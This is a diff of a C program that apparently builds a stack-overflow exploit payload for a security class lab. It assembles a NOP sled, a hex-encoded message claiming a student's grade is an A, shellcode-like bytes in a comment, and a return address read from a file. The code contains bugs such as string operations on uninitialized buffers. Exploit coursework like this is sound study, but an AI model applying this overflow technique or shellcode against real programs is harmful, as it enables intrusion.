@@ -1,7 +1,10 @@
 /*\xeb\x30\x32\x54\x79\x6c\x65\x72\x20\x4b\x69\x6d\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41\x48\x31\xc0\xb0\x01\x48\x89\xc7
 */
 #include <stdio.h>
-#define FILELEN 15
+#define FILELEN 16
+#include <stdlib.h>
+#define _OPEN_SYS_ITOA_EXT
+
 
 // void vulnerable() {
 //     //216 = x + 52 + 8
@@ -16,35 +19,24 @@
 
 // }
 
-int ascii_to_hex(char c) {
-    int num = (int) c;
-    if(num < 58 && num > 47) {
-        return num - 48;
-    }
-
-    if(num < 103 && num > 96) {
-        return num - 87;
-    }
-    return num;
-}
-
 int main(int argc, char** argv) {
 
     //216 = 48 + 6 + 162
-    char buffer[216];    
-    //void* buffer;
+    char bufferVal[216];    
+    char buffer[8];
+    char bufferAddress[16];
     
-    // FILE *fp = fopen("address.txt","r");
-    // fscanf(fp, "%lx", (unsigned long) &buffer);
-    // fclose(fp);
-    // printf("Buffer address: %lx\n", buffer);
+    FILE *fp = fopen("address.txt","r");
+    fscanf(fp, "%lx", (unsigned long) &buffer);
+    //printf("Buffer address: %lx\n", buffer);
 
     for(int i = 0; i < 100; i++) {
-        strncat(buffer, "\x90", 1);
+        strncat(bufferVal, "\x90", 1);
     }
-    strncat(buffer, "\x54\x79\x6c\x65\x72\x20\x4b\x69\x6d\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41", 48);
-    strncat(buffer, "\x00\x00\x7f\xff\xff\xff\xde\x90", 8);
+    strncat(bufferVal, "\x54\x79\x6c\x65\x72\x20\x4b\x69\x6d\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41", 48);
+    strcat(bufferVal, buffer);
+    printf("%s", bufferVal);
+    fclose(fp);
 
-    printf("%s", buffer);
 }   
 
